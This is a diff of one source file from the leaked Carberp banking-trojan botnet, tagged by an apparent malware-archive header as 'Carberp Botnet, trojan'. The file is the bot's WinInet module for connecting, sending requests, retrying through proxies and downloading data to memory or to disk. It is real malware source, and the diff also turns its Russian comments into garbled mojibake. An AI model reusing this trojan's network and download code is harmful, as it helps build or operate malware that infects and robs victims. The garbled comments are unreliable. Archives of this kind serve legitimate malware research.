@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -12,16 +23,16 @@
 //User agent
 #define DEFAULT_USER_AGENT "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)"
 
-//Версия HTTP.
+//пїЅпїЅпїЅпїЅпїЅпїЅ HTTP.
 #define DEFAULT_HTTP_VERSION "HTTP/1.1"
 
-//Размер буфера при скачивании файла
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define WININET_BUFFER_SIZE 4096
 
-//Принимаемые типы.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 static LPSTR AcceptTypes[] = {"*/*", NULL};
 
-//Опции WinInet.
+//пїЅпїЅпїЅпїЅпїЅ WinInet.
 typedef struct
 {
   DWORD dwOption;
@@ -33,7 +44,7 @@ static WININETOPTION WinInetOptions[] =
   //Sets an unsigned long integer value that contains the time-out value, in milliseconds, to use for Internet connection requests.
   {INTERNET_OPTION_CONNECT_TIMEOUT,  1 * 60 * 1000},
   //Sets an unsigned long integer value that contains the error masks that can be handled by the client application.
-  //Баг в wininet.dll, повреждает стек или что-то в этом духе.
+  //пїЅпїЅпїЅ пїЅ wininet.dll, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ-пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   //{INTERNET_OPTION_ERROR_MASK, INTERNET_ERROR_MASK_COMBINED_SEC_CERT | INTERNET_ERROR_MASK_INSERT_CDROM | INTERNET_ERROR_MASK_LOGIN_FAILURE_DISPLAY_ENTITY_BODY},
   //Sets an unsigned long integer value that contains the time-out value, in milliseconds, to receive a response to a request.
   {INTERNET_OPTION_RECEIVE_TIMEOUT, 1 * 60 * 1000},
@@ -56,16 +67,16 @@ void Wininet::Uninit(void)
 
 HINTERNET Wininet::_Connect(LPSTR pstrUserAgent, LPSTR pstrHost, WORD wPort, DWORD dwFlags)
 {
-  //"Создание" интернета.
+  //"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   HINTERNET hInet = CWA(wininet, InternetOpenA)(pstrUserAgent ? pstrUserAgent : DEFAULT_USER_AGENT,
                                                 dwFlags & WICF_USE_IE_PROXY ? INTERNET_OPEN_TYPE_PRECONFIG : INTERNET_OPEN_TYPE_DIRECT,
                                                 NULL, NULL, 0);
   if(hInet == NULL)return NULL;
 
-  //Устанавлиаем настройки.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   for(DWORD i = 0; i < sizeof(WinInetOptions) / sizeof(WININETOPTION); i++)CWA(wininet, InternetSetOptionA)(hInet, WinInetOptions[i].dwOption, (void *)&WinInetOptions[i].dwValue, sizeof(DWORD));
 
-  //Подключение, как таковое соединение не устанавливается. Ебанутый M$.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ M$.
   HINTERNET hConnect = CWA(wininet, InternetConnectA)(hInet, pstrHost, wPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
   if(hConnect == NULL)
   {
@@ -141,12 +152,12 @@ HINTERNET Wininet::_SendRequest(HINTERNET hConnect, LPSTR pstrURI, LPSTR pstrRef
   WDEBUG1(WDDT_INFO, "pstrURI=%S", pstrURI);  
 # endif
   
-  //Создание запроса.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   HINTERNET hReq = CWA(wininet, HttpOpenRequestA)(hConnect, dwFlags & WISRF_METHOD_POST ? "POST" : "GET", pstrURI, DEFAULT_HTTP_VERSION, pstrReferer, (LPCSTR *)AcceptTypes, dwReqFlags, NULL);
 
   if(hReq != NULL)
   {
-    //Отправка запроса.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     LPSTR headers;
     DWORD headersSize;
     
@@ -181,14 +192,14 @@ bool Wininet::_DownloadData(HINTERNET hRequest, MEMDATA *pBuf, DWORD dwSizeLimit
   {
     if(hStopEvent != NULL && CWA(kernel32, WaitForSingleObject)(hStopEvent, 0) != WAIT_TIMEOUT)break;
 
-    //Выделение памяти.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     DWORD dwReaded = WININET_BUFFER_SIZE;
     if(!Mem::reallocEx(&pDownloaded, dwDownloaded + dwReaded))break;
 
-    //Чтение данных.
+    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     if(!CWA(wininet, InternetReadFile)(hRequest, pDownloaded + dwDownloaded, dwReaded, &dwReaded))break;
 
-    //Все прочитано.
+    //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(dwReaded == 0)
     {
       if(pBuf)
@@ -202,7 +213,7 @@ bool Wininet::_DownloadData(HINTERNET hRequest, MEMDATA *pBuf, DWORD dwSizeLimit
 
     dwDownloaded += dwReaded;
 
-    //Привышин лимит.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     if(dwDownloaded > dwSizeLimit)break;
   }
 
@@ -224,10 +235,10 @@ bool Wininet::_DownloadDataToFile(HINTERNET hRequest, LPWSTR pstrFileName, DWORD
       {
         if(hStopEvent != NULL && CWA(kernel32, WaitForSingleObject)(hStopEvent, 0) != WAIT_TIMEOUT)break;
 
-        //Чтение данных.
+        //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
         if(!CWA(wininet, InternetReadFile)(hRequest, pBuf, WININET_BUFFER_SIZE, &dwReaded))break;
 
-        //Все прочитано.
+        //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         if(dwReaded == 0)
         {
           CWA(kernel32, FlushFileBuffers)(hFile);
@@ -235,11 +246,11 @@ bool Wininet::_DownloadDataToFile(HINTERNET hRequest, LPWSTR pstrFileName, DWORD
           break;
         }
         
-        //Пишим
+        //пїЅпїЅпїЅпїЅпїЅ
         if(!CWA(kernel32, WriteFile)(hFile, pBuf, dwReaded, &dwWrited, NULL) || dwReaded != dwWrited)break;
         dwDownloaded += dwReaded;
         
-        //Привышин лимит.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
         if(dwDownloaded > dwSizeLimit)break;
       }
 
@@ -265,7 +276,7 @@ bool Wininet::_CallURL(CALLURLDATA *pcud, MEMDATA *pBuf)
 
     for(BYTE bi = 0; bi < pcud->bTryCount; bi++)
     {
-      //Задержка.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       if(bi > 0)
       {
         if(pcud->hStopEvent != NULL)
@@ -287,7 +298,7 @@ bool Wininet::_CallURL(CALLURLDATA *pcud, MEMDATA *pBuf)
       {
         if(pp == 1)dwConnectFlags &= ~(WICF_USE_IE_PROXY);
 
-        //Подключение.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         HINTERNET hConnect = _Connect(pcud->pstrUserAgent, ud.host, ud.port, dwConnectFlags);
         if(hConnect)
         {
@@ -329,7 +340,7 @@ LPSTR Wininet::_GetIEUserAgent(void)
       
       if(fnc(0, ua, &uas) == NOERROR)
       {
-        //Не доверяю MS. Плохо как то документирована эта функция, и странно юзается в Win2k.
+        //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ MS. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ Win2k.
         if(uas > sizeof(ua) - 1)uas = sizeof(ua) - 1;
         ua[uas] = 0;
         
